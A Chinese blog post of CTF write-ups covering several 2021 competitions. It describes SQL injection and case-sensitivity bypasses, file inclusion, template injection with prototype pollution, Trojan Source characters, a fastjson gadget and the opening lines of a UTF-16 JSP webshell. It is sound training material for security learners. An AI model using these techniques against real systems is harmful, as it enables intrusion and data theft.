@@ -1,0 +1,1048 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="拟态&amp;L3H&amp;深育&amp;湖湘&amp;西湖&amp;N1拟态决赛和L3H打不过，深育杯错过了没打，湖湘杯。。。妄图最后一个小时通过关积分榜的方式反抗诸神黄昏，然后直接打到诸神全灭，经典西湖论剑做了一天牢，三个究极CMS审计血克我这种垃圾，唯一一个有希望的模板渲染也跑偏了。。。N1CTF也看了一眼题，除了签到只有一个看懂了呢 慢慢的看wp进行复现或者事后诸葛亮 拟态决赛除了拟态环">
+<meta property="og:type" content="article">
+<meta property="og:title" content="拟态&amp;L3H&amp;深育&amp;湖湘&amp;西湖&amp;N1">
+<meta property="og:url" content="https://blog.z3ratu1.cn/%E6%8B%9F%E6%80%81&L3H&%E6%B7%B1%E8%82%B2&%E6%B9%96%E6%B9%98&%E8%A5%BF%E6%B9%96&N1.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="拟态&amp;L3H&amp;深育&amp;湖湘&amp;西湖&amp;N1拟态决赛和L3H打不过，深育杯错过了没打，湖湘杯。。。妄图最后一个小时通过关积分榜的方式反抗诸神黄昏，然后直接打到诸神全灭，经典西湖论剑做了一天牢，三个究极CMS审计血克我这种垃圾，唯一一个有希望的模板渲染也跑偏了。。。N1CTF也看了一眼题，除了签到只有一个看懂了呢 慢慢的看wp进行复现或者事后诸葛亮 拟态决赛除了拟态环">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-11-18T06:47:11.000Z">
+<meta property="article:modified_time" content="2021-12-06T13:42:36.156Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="gopher">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/%E6%8B%9F%E6%80%81&L3H&%E6%B7%B1%E8%82%B2&%E6%B9%96%E6%B9%98&%E8%A5%BF%E6%B9%96&N1.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>拟态&L3H&深育&湖湘&西湖&N1 | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/%E6%8B%9F%E6%80%81&L3H&%E6%B7%B1%E8%82%B2&%E6%B9%96%E6%B9%98&%E8%A5%BF%E6%B9%96&N1.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          拟态&L3H&深育&湖湘&西湖&N1
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-11-18 14:47:11" itemprop="dateCreated datePublished" datetime="2021-11-18T14:47:11+08:00">2021-11-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-12-06 21:42:36" itemprop="dateModified" datetime="2021-12-06T21:42:36+08:00">2021-12-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/%E6%8B%9F%E6%80%81&L3H&%E6%B7%B1%E8%82%B2&%E6%B9%96%E6%B9%98&%E8%A5%BF%E6%B9%96&N1.html" class="post-meta-item leancloud_visitors" data-flag-title="拟态&L3H&深育&湖湘&西湖&N1" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/%E6%8B%9F%E6%80%81&L3H&%E6%B7%B1%E8%82%B2&%E6%B9%96%E6%B9%98&%E8%A5%BF%E6%B9%96&N1.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/%E6%8B%9F%E6%80%81&L3H&%E6%B7%B1%E8%82%B2&%E6%B9%96%E6%B9%98&%E8%A5%BF%E6%B9%96&N1.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="拟态-amp-L3H-amp-深育-amp-湖湘-amp-西湖-amp-N1"><a href="#拟态-amp-L3H-amp-深育-amp-湖湘-amp-西湖-amp-N1" class="headerlink" title="拟态&amp;L3H&amp;深育&amp;湖湘&amp;西湖&amp;N1"></a>拟态&amp;L3H&amp;深育&amp;湖湘&amp;西湖&amp;N1</h1><p>拟态决赛和L3H打不过，深育杯错过了没打，湖湘杯。。。妄图最后一个小时通过关积分榜的方式反抗诸神黄昏，然后直接打到诸神全灭，经典<br>西湖论剑做了一天牢，三个究极CMS审计血克我这种垃圾，唯一一个有希望的模板渲染也跑偏了。。。N1CTF也看了一眼题，除了签到只有一个看懂了呢</p>
+<p>慢慢的看wp进行复现或者事后诸葛亮</p>
+<h2 id="拟态决赛"><a href="#拟态决赛" class="headerlink" title="拟态决赛"></a>拟态决赛</h2><p>除了拟态环境N连外，还有两个题看了一下，都是做到最后一步做不出来了。。猛男落泪.jpg<br>黑盒看不懂，白盒要钱没人一起就没试过。总的来说是没体验到什么东西了</p>
+<h3 id="拟态4连"><a href="#拟态4连" class="headerlink" title="拟态4连"></a>拟态4连</h3><p>这个题，说实话，做到最后一题的时候感觉出的还行，但是之前的部分完全脑溢血<br>四个题打开页面啥也没有，就注释里一行像base64的东西，但是base64解码还解不开。一开始一度卡在这，最后把misc爷爷叫了出来，他最后整了个变表base64解出来了。。。<br>用的这个网站<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p>
+<p>解出来之后就很好说了，base64的内容是三个api，让你去试这三个API</p>
+<h4 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h4><p>只有一个能用，然后访问之后会回显一个step2的一个API访问，然后访问step2回显step3，访问step3获得flag。。。。说实话做到这的时候心态非常爆炸，我想说这是什么傻逼才能出出来的题</p>
+<p>不过这里有一个比较奇怪的点，就是他的逻辑和普通的web服务不一样，他记录你的访问顺序，访问结果和访问顺序有关<br>你必须先访问API1再访问API2最后访问API3才能获取flag</p>
+<h4 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h4><p>同1，三个API只有一个能用，然后step3回显了一个mimic shell，在http body处输啥执行啥。。。然后再给flag套了一层aes，看到了后端是用go写的，直接硬看go的二进制文件，找到密钥明文，解出flag</p>
+<h4 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h4><p>同1，三个API只有一个能用，也是step3回显mimic shell，不过总算有点拟态的样子了。这把会发现有时候发过去的请求响应并不对，但重复几次之后似乎又会正确。思考了一下，感觉应该是存在了多个后端，并且每次的请求随机发放到某个后端，又因为在1中已经发现了请求是被记录的，和访问顺序有关，所以只要重复发送请求，每一个步骤确保能发送到那个可执行的后端即可</p>
+<h4 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h4><p>脑洞大开的题，同样是三个API，有两个输入不会有任何反应，还有一个输入后会报错，显示后端比对结果不同，不予显示，并且似乎乱输入之前已知的api&#x2F;step2之类的路由，有时候会连续触发报错</p>
+<p>仔细思考之后，这个就是拟态的概念，由多个异构后端同时执行输入，结果完全一致则返回，否则报警，存在多个后端，其中有一个能执行命令，然而执行命令时一定会出现不同的回显，从而导致报警。<br>并且还需要从之前三题中得到的规律去猜测命令执行的步骤应该是一致的，开始究极盲打命令执行</p>
+<p>这里还有一个坑点，就是命令执行的步骤一定是回显不同的，因此并不能在命令执行的过程中进行判断（整个比赛都是在内网中举办的，不通外网，不同题目直接的网段都是隔离的），但是没试sleep。。。如果是每个执行结束再比对回显的话，也许sleep会方便一些</p>
+<p>这个非常脑洞的思路是由老国王想出的，于是他通过逐位盲注flag，正确则修改index.html使得在正常情况下页面比较也不一致的方法，一位一位的盲注出了flag</p>
+<h3 id="disable"><a href="#disable" class="headerlink" title="disable"></a>disable</h3><p>是一个全靠猜的奇怪题目，走到最后一步不会做了呜呜<br>给了三个参数<code>do think show</code>，也不说能干嘛，就嗯猜，最后我猜出来show是读文件，然后发现还有过滤，不给读php，最后再猜，猜出来是个文件包含（不要问我怎么猜出来的），然后用upload progress经典文件包含打通。<br>先看了眼phpinfo，好家伙，直接把他用过的以外的基本上所有函数都给干掉了，我本地拿get_defined_func和他的disable_function作比较，就留了几个curl系列函数和mail，putenv，问题是我写文件的函数都没有，怎么用mail和putenv打呢？研究了半天curl写文件，一无所获，不会了（并且本地比对出来的curl函数远程也不一定有）</p>
+<h4 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h4><p>另：因为他用了highlight_file，所以可以任意文件读，然后我看了一眼<code>do think show</code>的功能，do要先等于think，然后think再过一个超级过滤，长度还不能大于10，之后进eval。这有屁用啊，这个源码你拿出来我都不会用think去命令执行好吗，并且没源码就嗯猜这个功能吗。show就是限制长度和一定过滤的文件包含</p>
+<h3 id="hbs"><a href="#hbs" class="headerlink" title="hbs"></a>hbs</h3><p>题目名是啥忘了，反正是打hbs模板注入<br>先给了一部分源码，先是一个SQL注入登进去，黑名单过滤了一堆东西，但是是用nodejs写的，黑名单过滤用的include判断，额，好像不区分大小写，大小写直接过，然后注入要求又是输入的password要等于结果的password，用我之前在第五空间提到的经典套娃payload过<br>登进去之后一个后台，可以改头像和改签名，研究了半天，发现在改头像那有任意文件读，可以把头像图片改成其他文件，不过他对请求的时间戳有限制，所以写个脚本拿，可以拿到后台部分的源码，是一个hbs模板注入，还提供了一个原型链污染的点<br>（做到这的时候，我感觉这个题就是前面东华杯的强化版。。。）<br>原型链污染过滤了<code>__proto__</code>，但是不是不允许包含这个字符串，而是不能单独出现这个字符串。。。那不就又是垃圾代码，用肯定是<code>__proto__.xxx</code>这样子去赋值的啊</p>
+<p>可以渲染hbs模板，但是只能渲染他的模板，并且渲染参数也被控制了，似乎一个原型链污染也不会有太大的攻击面，又不能写文件渲染自己的模板，不会了</p>
+<h2 id="L3H"><a href="#L3H" class="headerlink" title="L3H"></a>L3H</h2><p>高强度坐牢，web爷爷出了两个简单一点的题，剩下三个题两个java一个要点逆向，直接躺平</p>
+<h3 id="image-service1"><a href="#image-service1" class="headerlink" title="image service1"></a>image service1</h3><p>简单题1，主要是看附件里的init.sql可以看出来</p>
+<pre class=" language-MYSQL"><code class="language-MYSQL">-- MySQL dump 10.13  Distrib 8.0.27, for Linux (x86_64)
+--
+-- Host: localhost    Database: ctf
+-- ------------------------------------------------------
+-- Server version       8.0.27
+
+/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
+/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
+/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
+/*!50503 SET NAMES utf8mb4 */;
+/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
+/*!40103 SET TIME_ZONE='+00:00' */;
+/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
+/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
+/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
+/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
+
+--
+-- Current Database: `ctf`
+--
+
+CREATE DATABASE /*!32312 IF NOT EXISTS*/ `ctf` /*!40100 DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci */ /*!80016 DEFAULT ENCRYPTION='N' */;
+
+USE `ctf`;
+
+--
+-- Table structure for table `images`
+--
+
+DROP TABLE IF EXISTS `images`;
+/*!40101 SET @saved_cs_client     = @@character_set_client */;
+/*!50503 SET character_set_client = utf8mb4 */;
+CREATE TABLE `images` (
+  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
+  `user_id` bigint unsigned DEFAULT NULL,
+  `image_id` longtext,
+  PRIMARY KEY (`id`),
+  KEY `fk_users_images` (`user_id`),
+  CONSTRAINT `fk_users_images` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
+/*!40101 SET character_set_client = @saved_cs_client */;
+
+--
+-- Dumping data for table `images`
+--
+
+LOCK TABLES `images` WRITE;
+/*!40000 ALTER TABLE `images` DISABLE KEYS */;
+/*!40000 ALTER TABLE `images` ENABLE KEYS */;
+UNLOCK TABLES;
+
+--
+-- Table structure for table `shares`
+--
+
+DROP TABLE IF EXISTS `shares`;
+/*!40101 SET @saved_cs_client     = @@character_set_client */;
+/*!50503 SET character_set_client = utf8mb4 */;
+CREATE TABLE `shares` (
+  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
+  `user_id` bigint unsigned DEFAULT NULL,
+  `link` longtext,
+  PRIMARY KEY (`id`),
+  KEY `fk_users_shares` (`user_id`),
+  CONSTRAINT `fk_users_shares` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
+/*!40101 SET character_set_client = @saved_cs_client */;
+
+--
+-- Dumping data for table `shares`
+--
+
+LOCK TABLES `shares` WRITE;
+/*!40000 ALTER TABLE `shares` DISABLE KEYS */;
+/*!40000 ALTER TABLE `shares` ENABLE KEYS */;
+UNLOCK TABLES;
+
+--
+-- Table structure for table `users`
+--
+
+DROP TABLE IF EXISTS `users`;
+/*!40101 SET @saved_cs_client     = @@character_set_client */;
+/*!50503 SET character_set_client = utf8mb4 */;
+CREATE TABLE `users` (
+  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
+  `username` varchar(191) DEFAULT NULL,
+  `password` longtext,
+  PRIMARY KEY (`id`),
+  UNIQUE KEY `uniq_username` (`username`)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
+/*!40101 SET character_set_client = @saved_cs_client */;
+
+--
+-- Dumping data for table `users`
+--
+
+LOCK TABLES `users` WRITE;
+/*!40000 ALTER TABLE `users` DISABLE KEYS */;
+/*!40000 ALTER TABLE `users` ENABLE KEYS */;
+UNLOCK TABLES;
+/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
+
+/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
+/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
+/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
+/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
+/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
+/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
+/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
+
+-- Dump completed on 2021-11-09  8:43:51
+</code></pre>
+<p>这个SQL文件模板感觉也非常的靠谱，抄一下，也许以后能用少，内联注释的各种操作保证数据库的各种兼容性，字符集还是用的utf8mb4，究极安全，防御各种宽字节以及特殊编码打击</p>
+<p>一共三个表，images，shares，users，用户那里设置了username是unique的，所以也没法用SQL约束攻击也打不通。images存了用户上传的图片信息，而shares存的是用户选择公开的图片的信息</p>
+<p>images和shares都使用user_id来标识文件的所有权。服务一共就三个功能，上传，分享，搜索他人的分享</p>
+<p>搜索他人的分析是输用户名的，但admin不被允许，所以没法之前看admin的分析内容<br>但是ADMIN就可以了。。。因为过滤应该是只过滤了全小写的admin字符，而查询的方式应该是通过username查userID，再通过userID查分享内容，这样子mysql默认不区分大小写，用大小写就能绕过获取到flag</p>
+<h3 id="image-service2"><a href="#image-service2" class="headerlink" title="image service2"></a>image service2</h3><p>嗯，分析了半天发现完全没法打，估计要逆向，然后re爷爷不会看go，也没有动调，我也不会动调（这两天就学gdb），不会</p>
+<p>图片分享时需要一个token进行核验，token目测是根据图片的uuid以及渲染的一系列参数确定的，admin分享了两个flag，第一个flag因为没有任何渲染，可以直接看见，而第二个不仅只截取了部分，还加了模糊和额外的文本，无法识别。</p>
+<p>虽然我们可以用自己的图片提交参数得到对应的渲染结果，但是我们并不知道后端是怎么进行token的计算的，尝试直接用自己的账号去渲染flag图片的uuid，显示没有这个图，所以渲染时是会对图片所有权进行检测的，那没办法了</p>
+<p>看wp发现原来大家的web选手都是会逆向的啊。直接gdb下断点就拿到了token的构造方式，然后构造属性字段，使得自己图片构造出的token和admin分享的图片的token值一致即可</p>
+<p>如果能拿到token构造后面这步也并不难，可惜了。不甘心ing</p>
+<h4 id="update"><a href="#update" class="headerlink" title="update"></a>update</h4><p>gdb学成归来，直接让pwn爷爷手把手带一下，很简单嘛，我已经完全掌握了.jpg<br>先装一个无敌的pwndbg插件，调试的时候直接显示堆栈寄存器，吴迪</p>
+<p>然后把那个提供图片服务的main丢进ida，不要管怎么用，旁边有显示函数名字（是go本身保留了这些调试信息吗？还是出题人的好心？）<br>直接找到两个看起来比较像样的函数<br><code>gitlab_l3hsec_com_l3hctf_image_service_token_Sign</code>以及<code>gitlab_l3hsec_com_l3hctf_image_service_token_Check</code><br>f5反汇编，tab切到text显示，直接看地址（pwn爷爷和我说这个是没开无敌的地址随机化的，所以这里的地址有6位十六进制数，开了的话应该只有最后12bit（还是16？）是固定的，那个时候ida就只显示3&#x2F;4个十六进制数，这个时候就要先start把程序load进来，然后看内存映射情况，在加上偏移后为函数实际地址</p>
+<p><code>b *addr</code>（十六进制地址）打断点，<code>n</code>step over，<code>s</code>step into，然后直接在sign和check处打断点，<code>gdb main</code>启动，直接访问一下服务，<code>c</code>运行到断点处（大概），就一直step over，因为pwndbg这个插件能自动显示断点处的各种变量堆栈之类的情况，就边单步边看，能在sign中看到拼接出来的结果<br>大概为<code>map[key:[value]]</code>这个样子（就是参考链接中wp的那个样子），得到这个结果基本上就能开始构造了</p>
+<p>说起来好像不是很难呜呜</p>
+<h3 id="RGB"><a href="#RGB" class="headerlink" title="RGB"></a>RGB</h3><p>上来就highlight file，并且代码还非常简单，只要get两个参数和预期的值一样就行了，但是直接提交的话，完全行不通，稍微点击一下就能发现似乎有些字符隔空进行了连接，这也是注释里出现了不同颜色的字符的原因。直接开console看的话看到的是<code>&amp;#202e;</code>这么个字符<br>搜一下，发现这个字符的意思似乎是该行从右至左展示，甚至搜出来的条目的title因为包含了这个字符都变成反的了。。。。比如这个，最骚的是，这种特殊字符能被复制下来，而不像其他的字符会变成空格<br><code>‮- 从右至左强制: U+202E - Unicode 字符百科‬</code></p>
+<p>思考了半天其中的逻辑，最后发现直接python requests拉下来然后整体url编码硬看原始数据就行了<br>这个还赋予了一个CVE号，表明可以使用这些字符误导开发者，在注释中藏匿有害代码，（但事实上复制到txt里面的时候会显示出这个特殊字符，而复制到jetbrain全家桶时，会显示该文本含有类似字符的提示）<br>大致原理就是反复套强制从左至右和从右至左，就能把代码以不符合其原始语义的形式进行展示<br>似乎有一个类似官网的网站<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://trojansource.codes/">Trojan Source</a></p>
+<h3 id="cover"><a href="#cover" class="headerlink" title="cover"></a>cover</h3><p>是一个古老的框架，可以直接下源码下来，翻源码可以看到默认管理员账户密码，直接登进去，然后不会了，看完wp说是fastjson 1.2.68的全新玩法，虽然赛时就给了hint，不过那个时候已经躺平了，到时候另作学习</p>
+<p><strong>并不是什么古老的框架，题目用的前端框架叫adminex，而我刚好在GitHub上搜到了一个叫adminex的后端框架，还刚好是用java写的。。。然后我就看了那个玩意半天，并且hint给出了fastjson，我还找了半天怎么找不到哪里调用了fastjson。无语了</strong></p>
+<p>题解就是1.2.68的一个盲注读文件的payload，在今年的blackhat USA上有披露，直接抄来就能打<br>这里还是有一些trick，虽然我还不怎么熟练，但稍微记录一下<br>题目代码是这样子的<code>JSON.parseArray(data,User.class);</code>(hint中给出，我那个时候就在想我下下来的adminex怎么没这回事)。。。</p>
+<p>首先是parseArray，所以传过去的数据得是个数组，这个很简单，套一层数组就行了，然后这里指定了反序列化的类，得是User类，所以不能直接打我们的payload，绕过方法似乎很多，比如给User类随便加一个属性，这个属性的值就是我们的payload值（也许要先在值外面套一层JSONObject？），或者看nepnep的wp中写的，把user的age属性指定成一个JSONObject，然后再在里面把payload套进去（感觉是一样的），用<code>$ref</code>这个关键字表示这个值引用另一个值，可以用来触发属性的get方法</p>
+<p>关于<code>$ref</code>如何触发get方法<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/solitudi/article/details/120275526">Fastjson＞&#x3D;1.2.36$ref引用可触发get方法分析</a></p>
+<p>payload就是这里面的<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg">关于blackhat2021披露的fastjson1.2.68链</a></p>
+<h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><p>传jsp马的超级过滤题，先是把jsp替换到空，这个过滤约等于没有过滤，然后来了个<code>[a-zA-Z0-9]&#123;2,&#125;</code>的究极过滤，直接不会，搜无字母数字shell之类的东西永远是PHP的那几个和P神的文章，不会了</p>
+<p>看wp是用的UTF-16编码。虽然不知道能有这个操作，但确实a-zA-z0-9只允许连续出现一次这个操作，非常的契合UTF-16编码。害，没想到。因为当初UTF-16这里都没过，所以他还有一个没有开源的黑名单过滤，不知道过滤了些啥，也搞不出来了。并且现在环境也关了。。。</p>
+<p>这边看杭电的wp是用的<code>ScriptEngineFactory</code>这个类之间过了。jsp的shell也没收集过啥。。不知道有哪些能用，抄一下吧</p>
+<pre class=" language-jsp"><code class="language-jsp"><%@ page language="java" pageencoding="UTF-16BE" %>
+<%@ page import="java.util.Iterator" %>
